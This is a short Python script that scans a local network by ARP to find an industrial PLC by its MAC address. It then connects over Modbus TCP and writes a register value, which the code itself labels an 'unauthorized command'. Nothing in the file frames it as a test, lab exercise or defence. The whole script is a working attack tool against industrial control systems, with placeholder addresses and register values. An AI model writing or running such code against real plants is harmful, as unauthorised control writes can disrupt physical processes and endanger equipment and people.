import socket
import struct
import time
from scapy.all import ARP, Ether, srp
from pymodbus.client.sync import ModbusTcpClient

# Function to discover the PLC's IP address
def discover_plc_ip():
    # Define the IP range to scan (adjust as needed)
    ip_range = "192.168.1.0/24"
    
    # Create an ARP request packet
    arp = ARP(pdst=ip_range)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether/arp
    
    # Send the packet and capture the response
    result = srp(packet, timeout=2, verbose=False)[0]
    
    # Parse the response to find the PLC's IP address
    for sent, received in result:
        print(f"IP: {received.psrc} - MAC: {received.hwsrc}")
        # Assuming the PLC has a specific MAC address or other identifying feature
        # For demonstration, we'll assume the PLC's MAC address is "00:11:22:33:44:55"
        if received.hwsrc == "00:11:22:33:44:55":
            return received.psrc
    
    return None

# Function to send an unauthorized command to the PLC
def send_unauthorized_command(plc_ip):
    # Create a Modbus TCP client
    client = ModbusTcpClient(plc_ip)
    
    # Connect to the PLC
    if not client.connect():
        print(f"Failed to connect to PLC at {plc_ip}")
        return
    
    # Define the register address and value for the unauthorized command
    # For example, register 0x0001 to set a specific control action
    register_address = 0x0001
    command_value = 0x01  # Example value to activate a control action
    
    # Write the unauthorized command to the PLC
    try:
        result = client.write_register(register_address, command_value)
        if result.isError():
            print(f"Failed to send command to PLC at {plc_ip}")
        else:
            print(f"Unauthorized command sent to PLC at {plc_ip}")
    except Exception as e:
        print(f"Error sending command: {e}")
    
    # Close the connection
    client.close()

# Main function
def main():
    # Discover the PLC's IP address
    plc_ip = discover_plc_ip()
    if plc_ip:
        print(f"PLC found at IP: {plc_ip}")
        # Send the unauthorized command
        send_unauthorized_command(plc_ip)
    else:
        print("PLC not found on the network")

if __name__ == "__main__":
    main()